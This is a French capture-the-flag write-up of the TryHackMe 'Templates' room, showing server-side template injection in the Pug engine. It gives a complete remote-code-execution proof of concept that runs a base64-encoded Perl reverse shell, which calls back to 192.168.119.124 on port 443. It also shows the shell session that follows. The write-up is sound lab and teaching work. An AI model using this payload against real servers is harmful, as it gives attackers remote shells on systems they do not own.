@@ -1,0 +1,70 @@
+https://tryhackme.com/room/templates
+
+Pour notre épisode 4, nous faisons face à une webapp utilisant le moteur de template Pug.
+Cet épisode fut mon premier contact avec les failles de type SSTI, je me suis donc appuyé sur le cours fourni avec la room.
+
+Objectif : Retrouver le flag
+
+On lance la machine, et on ouvre la page web correspondante, et let's rock !
+
+La page web nous fourni la possibilité de tester le moteur de template, dans le but explicite de produire du code html.
+
+Suivant le cours fourni par THM concernant les SSTI, nous allons tester différents symboles.
+L'objectif est de vérifier si la cible est bien vulnérable.
+
+La plupart des symboles testés nous donne le résultat suivant :
+Error: Pug:1:1
+  > 1|
+Unexpected text
+
+Mais quand nous rentrons le symbole # :
+TypeError: Cannot read property '0' of null
+
+Ah ! Ca devient intéressant.
+
+On continue de suivre le cours pour confirmer que ce symbole pourra être utilisé de manière efficiente :
+En entrée :
+#{6*7}
+En sortie :
+<42></42>
+
+On est bon.
+
+Nous allons donc pouvoir ouvrir une reverse shell. 
+Un petit tour sur Github, l'avantage est que nous connaissons déjà le moteur de template utilisé, Pug, donc pas besoin de passer par la phase d'identification.
+
+On tombe rapidement sur cette PoC :
+
+h1= title
+p Welcome to #{3*3}
+
+#{spawn_sync = this.process.binding('spawn_sync')}
+#{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}}
+#{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}}
+#{payload='dXNlIFNvY2tldDskaT0iMTkyLjE2OC4xMTkuMTI0IjskcD00NDM7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Cg=='}
+#{resp=spawnSync('perl',['-e',(new Buffer(payload, 'base64')).toString('ascii')])}
+
+Trouvable à l'adresse suivante :
+https://gist.github.com/Jasemalsadi/2862619f21453e0a6ba2462f9613b49f
+
+On réadapte le payload pour correspondre à notre IP et notre port du moment, et on ouvre un netcat avant d'envoyer le tout.
+
+La shell est ouverte :
+
+$ whoami
+user
+$ pwd
+/usr/src/app
+$ ls -la
+total 92
+drwxr-xr-x   1 root root  4096 Mar  2  2022 .
+drwxr-xr-x   1 root root  4096 Mar  2  2022 ..
+-rw-rw-r--   1 root root   464 Mar  2  2022 app.js
+-rw-rw-r--   1 root root    38 Mar  2  2022 flag.txt
+drwxr-xr-x 198 root root  4096 Mar  2  2022 node_modules
+-rw-r--r--   1 root root 64902 Mar  2  2022 package-lock.json
+-rw-rw-r--   1 root root   347 Mar  2  2022 package.json
+drwxrwxr-x   2 root root  4096 Mar  2  2022 views
+$ cat flag.txt
+
+Une room intéressante qui permet de bien appréhender un type de faille que je ne connaissais pas encore.
